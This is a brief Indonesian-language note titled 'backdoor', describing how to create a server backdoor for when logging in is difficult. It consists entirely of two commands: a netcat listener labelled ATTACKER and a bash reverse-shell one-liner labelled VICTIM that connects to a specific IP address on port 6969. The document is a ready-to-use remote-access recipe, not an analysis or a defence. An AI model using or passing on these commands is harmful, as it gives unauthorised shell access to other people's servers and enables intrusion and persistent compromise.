# backdoor
Buat pintu belakang server kalau misal susah login.

ATTACKER
```nc -nvvlp 6969```

VICTIM
```bash -i >& /dev/tcp/110.137.144.99/6969 0>&1```
